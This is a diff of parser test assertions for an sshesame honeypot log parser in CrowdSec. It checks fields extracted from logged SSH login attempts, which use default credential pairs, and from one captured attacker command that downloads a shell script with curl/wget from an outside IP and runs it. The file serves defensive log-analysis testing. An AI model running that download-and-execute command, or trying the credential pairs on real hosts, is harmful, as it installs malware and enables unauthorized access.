-results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] authentication for user \"admin\" with password \"admin1234\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58960] authentication for user \"2\" with password \"2\" accepted"
 results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["program"] == "sshesame"
 results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["source_ip"] == "64.31.47.254"
-results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["sshesame_password"] == "admin1234"
-results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["username"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["sshesame_password"] == "2"
+results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["sshesame_user"] == "2"
+results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["target_user"] == "2"
+results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["username"] == "2"
 results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["datasource_type"] == "file"
 results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["log_type"] == "sshesame_login"
 results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["service"] == "sshesame"
-results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["source_ip"] == "64.31.47.254"
-results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Meta["target_user"] == "admin"
 results["s01-parse"]["thespad/sshesame-logs"][11].Success == false
-results["s01-parse"]["thespad/sshesame-logs"][12].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][12].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Parsed["sshesame_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58710] authentication for user \"admin\" with password \"1234\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Parsed["sshesame_password"] == "1234"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Meta["target_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Meta["username"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][12].Evt.Meta["service"] == "sshesame"
 results["s01-parse"]["thespad/sshesame-logs"][13].Success == false
 results["s01-parse"]["thespad/sshesame-logs"][14].Success == false
-results["s01-parse"]["thespad/sshesame-logs"][15].Success == true
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] command \"cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh\" requested"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Parsed["program"] == "sshesame"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Parsed["source_ip"] == "64.31.47.254"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Parsed["sshesame_cmd"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Meta["command"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Meta["datasource_path"] == "sshesame.log"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Meta["datasource_type"] == "file"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Meta["log_type"] == "sshesame_cmd"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Meta["service"] == "sshesame"
-results["s01-parse"]["thespad/sshesame-logs"][15].Evt.Meta["source_ip"] == "64.31.47.254"
-len(results["s02-enrich"]["crowdsecurity/dateparse-enrich"]) == 4
+results["s01-parse"]["thespad/sshesame-logs"][15].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][16].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Parsed["sshesame_user"] == "1234"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58714] authentication for user \"1234\" with password \"1234\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Parsed["sshesame_password"] == "1234"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Meta["username"] == "1234"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][16].Evt.Meta["target_user"] == "1234"
+results["s01-parse"]["thespad/sshesame-logs"][17].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][18].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Parsed["sshesame_user"] == "cisco"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59062] authentication for user \"cisco\" with password \"cisco\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Parsed["sshesame_password"] == "cisco"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Meta["target_user"] == "cisco"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Meta["username"] == "cisco"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][18].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][19].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][20].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58862] authentication for user \"admin\" with password \"password\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Parsed["sshesame_password"] == "password"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Parsed["sshesame_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Meta["target_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Meta["username"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][20].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][21].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][22].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Parsed["sshesame_password"] == "support"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Parsed["sshesame_user"] == "support"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58738] authentication for user \"support\" with password \"support\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Meta["target_user"] == "support"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Meta["username"] == "support"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][22].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][23].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][24].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][25].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][26].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58932] authentication for user \"test\" with password \"test\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Parsed["sshesame_password"] == "test"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Parsed["sshesame_user"] == "test"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Meta["target_user"] == "test"
+results["s01-parse"]["thespad/sshesame-logs"][26].Evt.Meta["username"] == "test"
+results["s01-parse"]["thespad/sshesame-logs"][27].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][28].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58750] authentication for user \"user\" with password \"user\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Parsed["sshesame_password"] == "user"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Parsed["sshesame_user"] == "user"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Meta["target_user"] == "user"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Meta["username"] == "user"
+results["s01-parse"]["thespad/sshesame-logs"][28].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][29].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][30].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][31].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Parsed["sshesame_password"] == "admin1234"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Parsed["sshesame_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] authentication for user \"admin\" with password \"admin1234\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Meta["target_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][31].Evt.Meta["username"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][32].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][33].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][34].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][35].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][36].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Parsed["sshesame_cmd"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] command \"cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh\" requested"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Meta["command"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][36].Evt.Meta["log_type"] == "sshesame_cmd"
+results["s01-parse"]["thespad/sshesame-logs"][37].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][38].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58820] authentication for user \"root\" with password \"123456\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Parsed["sshesame_password"] == "123456"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Parsed["sshesame_user"] == "root"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Meta["target_user"] == "root"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Meta["username"] == "root"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][38].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][39].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][40].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58704] authentication for user \"ubnt\" with password \"ubnt\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Parsed["sshesame_password"] == "ubnt"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Parsed["sshesame_user"] == "ubnt"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Meta["target_user"] == "ubnt"
+results["s01-parse"]["thespad/sshesame-logs"][40].Evt.Meta["username"] == "ubnt"
+results["s01-parse"]["thespad/sshesame-logs"][41].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][42].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Parsed["sshesame_user"] == "pi"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58998] authentication for user \"pi\" with password \"raspberry\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Parsed["sshesame_password"] == "raspberry"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Meta["target_user"] == "pi"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Meta["username"] == "pi"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][42].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][43].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][44].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][45].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59228] authentication for user \"ubuntu\" with password \"ubuntu\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Parsed["sshesame_password"] == "ubuntu"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Parsed["sshesame_user"] == "ubuntu"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Meta["target_user"] == "ubuntu"
+results["s01-parse"]["thespad/sshesame-logs"][45].Evt.Meta["username"] == "ubuntu"
+results["s01-parse"]["thespad/sshesame-logs"][46].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][47].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][48].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Parsed["sshesame_user"] == "daemon"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58836] authentication for user \"daemon\" with password \"daemon\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Parsed["sshesame_password"] == "daemon"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Meta["target_user"] == "daemon"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Meta["username"] == "daemon"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][48].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][49].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][50].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][51].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Parsed["sshesame_password"] == "guest"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Parsed["sshesame_user"] == "guest"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58776] authentication for user \"guest\" with password \"guest\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Meta["target_user"] == "guest"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Meta["username"] == "guest"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][51].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][52].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][53].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Parsed["sshesame_password"] == "minecraft"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Parsed["sshesame_user"] == "minecraft"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59134] authentication for user \"minecraft\" with password \"minecraft\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Meta["target_user"] == "minecraft"
+results["s01-parse"]["thespad/sshesame-logs"][53].Evt.Meta["username"] == "minecraft"
+results["s01-parse"]["thespad/sshesame-logs"][54].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][55].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:58852] authentication for user \"telnet\" with password \"telnet\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Parsed["sshesame_password"] == "telnet"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Parsed["sshesame_user"] == "telnet"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Parsed["timestamp"] == "2022/04/16 20:45:50"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Meta["target_user"] == "telnet"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Meta["username"] == "telnet"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][55].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][56].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][57].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][58].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][59].Success == true
